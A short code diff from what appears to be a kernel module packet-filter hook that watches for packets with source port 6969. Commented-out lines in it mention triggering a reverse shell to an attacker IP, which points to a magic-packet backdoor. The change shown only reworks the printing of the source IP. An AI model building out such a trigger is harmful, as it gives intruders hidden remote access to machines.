@@ -92,13 +92,15 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     //printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
 
-            // Get the source IP
-        struct in_addr src_ip = ip_header->ip_src;
 
-        // Convert to human-readable string (optional)
-        char ip_str[INET_ADDRSTRLEN];
-
-        printf("Source IP: %s\n", ip_str);
+        char ip_str[INET_ADDRSTRLEN];  // Buffer for IP string
+        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
+                 (ip_header->ip_src.s_addr >> 24) & 0xFF,
+                 (ip_header->ip_src.s_addr >> 16) & 0xFF,
+                 (ip_header->ip_src.s_addr >> 8) & 0xFF,
+                 (ip_header->ip_src.s_addr) & 0xFF);
+        
+        printf("Kernel IP Address: %s\n", ip_str);
 
     printf("Packet with source port 6969 detected!!\n");
     return PFIL_PASS;
